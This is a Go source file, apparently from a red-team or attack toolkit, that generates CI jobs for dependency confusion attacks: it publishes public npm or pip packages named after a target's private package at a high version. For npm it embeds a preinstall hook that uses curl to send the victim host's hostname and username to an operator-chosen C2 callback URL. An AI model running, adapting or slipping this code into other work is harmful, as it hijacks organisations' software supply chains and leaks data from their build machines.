package payloads

import (
	"fmt"
	"strings"
)

// DepConfusionOptions configures a dependency confusion attack payload.
type DepConfusionOptions struct {
	Common      CommonOptions
	PackageName string // target private package name (e.g. @acme/utils)
	Version     string // version to publish (should be higher than internal)
	Ecosystem   string // npm, pip, go
	Registry    string // optional registry URL override
	CallbackURL string // C2 callback for install-time execution
}

// GenerateDepConfusionYAML generates a CI job that publishes a package to the
// public registry with the same name as a private package but a higher version,
// hijacking dependency resolution.
func GenerateDepConfusionYAML(o DepConfusionOptions) string {
	name, stage := o.Common.defaults("dep-confusion-publish")
	if o.Version == "" {
		o.Version = "99.0.0"
	}

	var script string
	switch o.Ecosystem {
	case "pip":
		script = generatePipConfusion(o)
	case "go":
		script = generateGoConfusion(o)
	default:
		script = generateNpmConfusion(o)
	}

	return fmt.Sprintf(`stages: [%s]

%s:
  stage: %s%s%s%s
  script:
    - |
%s`,
		stage, name, stage, imageLine(o.Common.Image), tagsLine(o.Common.Tags),
		rulesManual(o.Common.Manual), indentScript(script, "      "))
}

func generateNpmConfusion(o DepConfusionOptions) string {
	registryArg := ""
	if registry := strings.TrimSpace(o.Registry); registry != "" {
		registryArg = fmt.Sprintf(" --registry %q", registry)
	}
	callback := ""
	if o.CallbackURL != "" {
		callback = fmt.Sprintf(`
mkdir -p /tmp/pkg
cat > /tmp/pkg/package.json << 'PKGJSON'
{
  "name": "%s",
  "version": "%s",
  "scripts": {
    "preinstall": "curl -sS -X POST -d \"$(hostname):$(whoami)\" '%s/callback' || true"
  }
}
PKGJSON
cd /tmp/pkg && npm publish --access public%s || true`, o.PackageName, o.Version, o.CallbackURL, registryArg)
	} else {
		callback = fmt.Sprintf(`
mkdir -p /tmp/pkg
cat > /tmp/pkg/package.json << 'PKGJSON'
{
  "name": "%s",
  "version": "%s",
  "description": "dependency confusion proof of concept"
}
PKGJSON
cd /tmp/pkg && npm publish --access public%s || true`, o.PackageName, o.Version, registryArg)
	}
	return callback
}

func generatePipConfusion(o DepConfusionOptions) string {
	repositoryArg := ""
	if registry := strings.TrimSpace(o.Registry); registry != "" {
		repositoryArg = fmt.Sprintf(" --repository-url %q", registry)
	}
	return fmt.Sprintf(`
mkdir -p /tmp/pkg/%s
cat > /tmp/pkg/setup.py << 'SETUP'
from setuptools import setup
setup(name="%s", version="%s", packages=["%s"])
SETUP
cd /tmp/pkg && python3 setup.py sdist && twine upload%s dist/* || true`,
		o.PackageName, o.PackageName, o.Version, o.PackageName, repositoryArg)
}

func generateGoConfusion(o DepConfusionOptions) string {
	return fmt.Sprintf(`
echo "[*] Go module confusion: %s@v%s"
echo "Go modules use domain-based paths — confusion requires DNS control."
echo "Target: %s"`, o.PackageName, o.Version, o.PackageName)
}
